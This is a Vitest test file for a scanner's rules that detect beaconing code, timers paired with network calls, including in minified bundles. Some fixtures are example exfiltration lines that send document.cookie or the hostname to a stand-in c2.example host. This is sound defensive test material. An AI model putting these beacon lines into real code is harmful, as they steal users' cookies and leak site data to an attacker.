import { describe, expect, it } from "vitest";
import * as patterns from "../patterns.js";
import {
  ALL_PATTERN_SETS,
  isPatternApplicableToFile,
  matchPatternInContent,
} from "../patterns.js";
import type { PatternEntry } from "../types.js";

const shippedRule = (rule: string): PatternEntry => {
  const entry = ALL_PATTERN_SETS
    .flatMap(([, set]) => set)
    .find((candidate) => candidate.rule === rule);
  if (!entry) throw new Error(`Missing shipped rule: ${rule}`);
  return entry as PatternEntry;
};

const regexOnly = (entry: PatternEntry): PatternEntry => ({
  ...entry,
  correlatedMatcher: undefined,
});

/** The scanner runs the beacon set with "gi"; check matcher and pattern string. */
function lines(rule: string, content: string): { matcher: number[]; regex: number[] } {
  const entry = shippedRule(rule);
  return {
    matcher: matchPatternInContent(entry, content, "gi").map((hit) => hit.line),
    regex: matchPatternInContent(regexOnly(entry), content, "gi").map((hit) => hit.line),
  };
}

describe("beacon rules require a transport call, not an identifier prefix", () => {
  it.each([
    ["BEACON_INTERVAL_FETCH", "setInterval(fetchNotifications, 30000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(forgotPassword, 1000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(refetchAxiosless, 1000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => forgot(user), 1000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => prefetch(route), 1000);"],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(fetchNotifications, 30000);"],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(forgotPassword, 1000);"],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(() => showForgot(), gotoDelay);"],
  ])("%s ignores %s", (rule, content) => {
    expect(lines(rule, content)).toEqual({ matcher: [], regex: [] });
  });

  it.each([
    [
      "BEACON_INTERVAL_FETCH",
      'setInterval(() => fetch("https://c2.example/b?d=" + btoa(document.cookie)), 30000);',
    ],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(() => axios.post(u, data), 5000);"],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(() => axios({ url: u, data }), 5000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => got.post(u, { json: data }), 60000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => https.get(u, cb), 60000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => window.fetch(u), 60000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => { const x = new XMLHttpRequest(); x.open('GET', u); x.send(); }, 9000);"],
    ["BEACON_TIMEOUT_FETCH", "SETTIMEOUT(() => AXIOS(url), 1)"],
  ])("%s still fires on %s", (rule, content) => {
    expect(lines(rule, content)).toEqual({ matcher: [1], regex: [1] });
  });

  it("keeps the interval twin's file exclusion, as on main", () => {
    const shared = (patterns as Record<string, unknown>).BEACON_NOT_FILE_PATTERN;
    expect(shared).toBeInstanceOf(RegExp);
    expect(shippedRule("BEACON_INTERVAL_FETCH").notFilePattern).toBe(shared);
  });

  // A minified bundle is one line, so the timer and the transport must sit
  // close together: the shape of htmx 2.0.4, where the nearest pair is 6,325
  // characters apart, reported medium in a committed htmx.min.js.
  it.each(["BEACON_TIMEOUT_FETCH", "BEACON_INTERVAL_FETCH"])(
    "%s bounds the timer-to-transport distance at 512 characters",
    (rule) => {
      const timer = rule === "BEACON_TIMEOUT_FETCH" ? "setTimeout(" : "setInterval(";
      const hits = (content: string) =>
        matchPatternInContent(shippedRule(rule), content, "gi").map((hit) => hit.line);
      expect(hits(`${timer}${" ".repeat(512)}fetch(u)`)).toEqual([1]);
      expect(hits(`${timer}${" ".repeat(513)}fetch(u)`)).toEqual([]);
      expect(hits(`${timer}function(){z(e);e=null},t)}${"a=b;".repeat(1600)}new XMLHttpRequest`)).toEqual([]);
    },
  );

  it("still finds a beacon inside a long minified line", () => {
    const filler = "var a=b(c),d=e[f];".repeat(400);
    const content = `${filler}setTimeout(()=>fetch("https://c2.example/b?h="+location.hostname),3e4);${filler}`;
    const hits = matchPatternInContent(shippedRule("BEACON_TIMEOUT_FETCH"), content, "gi");
    expect(hits).toHaveLength(1);
    expect(hits[0]!.match.index).toBe(filler.length);
  });

  // The scanned package names its own files: a name must not hide a beacon.
  it("scans a file named *.min.js for the timeout variant", () => {
    const content = 'setTimeout(()=>fetch("https://c2.example/b?h="+location.hostname),3e4)';
    const rule = shippedRule("BEACON_TIMEOUT_FETCH");
    expect(rule.notFilePattern).toBeUndefined();
    expect(isPatternApplicableToFile(rule, content, "lib/beacon.min.js")).toBe(true);
    expect(lines("BEACON_TIMEOUT_FETCH", content)).toEqual({ matcher: [1], regex: [1] });
  });
});
